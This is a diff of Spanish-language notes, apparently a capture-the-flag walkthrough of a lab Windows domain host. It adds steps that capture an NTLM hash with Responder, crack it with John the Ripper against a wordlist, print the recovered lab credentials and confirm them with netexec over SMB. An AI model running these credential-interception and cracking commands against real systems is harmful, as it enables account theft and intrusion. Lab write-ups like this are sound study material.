@@ -186,7 +186,7 @@ Usaremos [[CRACKMAPEXEC-NETEXEC]] para probar la contraseña encontrada contra t
 
 Nos muestra que la contraseña pertenece al siguiente usuario
 ```ad-hint
-Tiffany.Molina:NewIntelligenceCorpUser9876
+Tiffany.Molina::NewIntelligenceCorpUser9876
 ```
 
 
@@ -261,4 +261,18 @@ Ahora con el [[RESPONDER]]
 `responder -I tun0`
 
 Estaremos interceptando el trafico, y ya sabiendo que la autenticación vienen hasta nuestra maquina, veremos un hash ntlm
+
+Obtenemos el hash con un usuario llamado `Ted.Graves`
+
+Con [[JOHN THE RIPPER]] lo crakeamos
+`john --wordlist=/usr/share/wordlists/rockyou.txt hash`
+
+Y obtenemos el usuario y contraseña 
+```ad-hint
+Ted.Graves::Mr.Teddy
+```
+
+
+Comprobamos que las credenciales son las correctas
+`netexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'`
 
